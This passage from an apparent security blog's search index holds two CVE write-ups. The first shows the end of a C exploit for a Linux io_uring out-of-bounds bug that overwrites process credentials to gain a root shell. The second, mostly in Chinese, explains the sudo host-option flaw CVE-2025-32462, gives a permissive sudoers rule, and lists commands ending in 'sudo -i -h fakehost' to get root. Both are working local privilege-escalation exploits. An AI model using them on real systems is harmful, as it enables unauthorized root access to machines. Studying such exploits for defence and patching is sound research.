unchanged</span><br>    cred[<span class="hljs-number">1</span>] = <span class="hljs-number">0x0</span>; <span class="hljs-comment">// Set uid to 0</span><br>    cred[<span class="hljs-number">2</span>] = <span class="hljs-number">0x0</span>;<br>    cred[<span class="hljs-number">3</span>] = <span class="hljs-number">0x0</span>; <span class="hljs-comment">// Set suid and sgid to 0</span><br>    cred[<span class="hljs-number">4</span>] = <span class="hljs-number">0x0</span>; <br>    cred[<span class="hljs-number">5</span>] = <span class="hljs-number">0x0</span>; <br>    cred[<span class="hljs-number">6</span>] = <span class="hljs-number">0x0</span>; <br><br>    sqe = io_uring_get_sqe(&amp;ring);<br>    <span class="hljs-keyword">if</span>(sqe == <span class="hljs-literal">NULL</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;io_uring_get_sqe failed&quot;</span>);<br>    &#125;<br>    io_uring_prep_read_fixed(sqe, rw_fd, start_addr + page_offset * PAGE_SIZE, <span class="hljs-number">28</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    check_ret(io_uring_submit(&amp;ring), <span class="hljs-string">&quot;io_uring_submit failed&quot;</span>);<br>    io_uring_wait_cqe(&amp;ring, &amp;cqe);<br>    io_uring_cqe_seen(&amp;ring, cqe);<br><br>    log_msg(<span class="hljs-string">&quot;check privilege in child processes&quot;</span>);<br>    write(check_root_pipe[<span class="hljs-number">1</span>],buf, CRED_SPRAY+CRED_DRAIN);<br>    sleep(<span class="hljs-number">100000000</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>The main principle of the above exploit is to exhaust the credentials of the process and occupy as much buddy_memory as possible, so that when we spray the process (credential), the target can be within 500 consecutive pages. In this way, we can find the sprinkled credentials within 500 pages and generate a root shell.</p>]]></content>
    
    
    <categories>
      
      <category>CVE</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux</tag>
      
      <tag>io_uring</tag>
      
      <tag>EXP</tag>
      
      <tag>CVE</tag>
      
      <tag>OOB</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2025-32462</title>
    <link href="/2025/07/21/CVE-2025-32462/"/>
    <url>/2025/07/21/CVE-2025-32462/</url>
    
    <content type="html"><![CDATA[<h1 id="cve-2025-32462"><a href="#cve-2025-32462" class="headerlink" title="cve-2025-32462"></a>cve-2025-32462</h1><p><a href="https://github.com/sudo-project/sudo/blob/SUDO_1_8_8/NEWS">sudo&#x2F;NEWS at SUDO_1_8_8 · sudo-project&#x2F;sudo · GitHub</a></p><p>sudo -h(–host)的文档里 写了-h 只与-l可以相连使用。后期更新的时候让sudo -h可以和-e，-i等一起使用</p><span id="more"></span><p>sudo –host(-h) &lt;username&gt; -l(–list)</p><p><code>/etc/sudoer.d</code>用于查看一个用户在系统中拥有什么权限。这个权限有可能被越过，让一个用户能够在某一系统的权限提升到另一个系统上可能拥有的权限。对于在多台计算机之间共享单个sudoers配置文件或使用基于网络的用户目录（如LDAP）来提供系统sudoers规则的系统尤其有影响。</p><p>总结来说：sudo的 <code>h/--host</code>  选项未遵循最小权限原则，在非<code>-l</code>场景（如命令执行）中未验证主机规则边界。攻击者可以在<code>/etc/sudoer.d</code>文件中配置恶意规则</p><h3 id="sudoer-d编写规则"><a href="#sudoer-d编写规则" class="headerlink" title="sudoer.d编写规则"></a>sudoer.d编写规则</h3><p>&lt; user &gt; &lt; pc &gt; &#x3D; [字段1]  [字段2]  [字段3]</p><p>用户<code>user</code>可以在主机<code>pc</code>上…..<br>字段一表示对哪些用户&#x2F;组，格式为： （users: groups）<br>字段二表示是否需要密码<br>字段三表示可以执行的命令</p><p>example:</p><ul><li>ubuntu  fakehost&#x3D;(root)  NOPASSWD : ALL</li></ul><h3 id="影响"><a href="#影响" class="headerlink" title="影响"></a>影响</h3><p>主要影响那些在多台机器上使用同一份 sudoers 文件的系统管理员的系统。</p><h3 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h3><p>漏洞攻击需要满足两个要求</p><ul><li><p>攻击者获得一个已验证的用户</p></li><li><p>系统非默认配置，依赖于sudoers文件中存在的额外规则</p></li></ul><p>例子：</p><p>sudoers文件包含定义该用户在不同系统上权限的规则。</p><p>Alice hostA: some Privilege</p><p>Bob hostB: some Privilege</p><p>Bob logs into hostA, then run command <code>sudo -h hostB commandA</code></p><h3 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/SpongeBob-369/cve-2025-32462.git<br><span class="hljs-built_in">cd</span> cve-2025-32462<br><span class="hljs-built_in">chmod</span> +x run.sh<br>./run.sh<br><span class="hljs-comment"># after entering the contain Ubuntu</span><br><span class="hljs-built_in">sudo</span> -l<br><span class="hljs-comment"># then prompt you to enter your password, but &quot;we&quot; don&#x27;t know.</span><br><span class="hljs-built_in">sudo</span> -l -h fakehost    <span class="hljs-comment"># Check the permissions user ubuntu have in host named  fakehost</span><br><span class="hljs-built_in">sudo</span> -i -h fakehost    <span class="hljs-comment"># get root</span><br></code></pre></td></tr></table></figure><p>:</p>]]></content>
    
    
    <categories>
      
      <category>CVE</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux</tag>
      
      <tag>EXP</tag>
      
      <tag>sudo</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
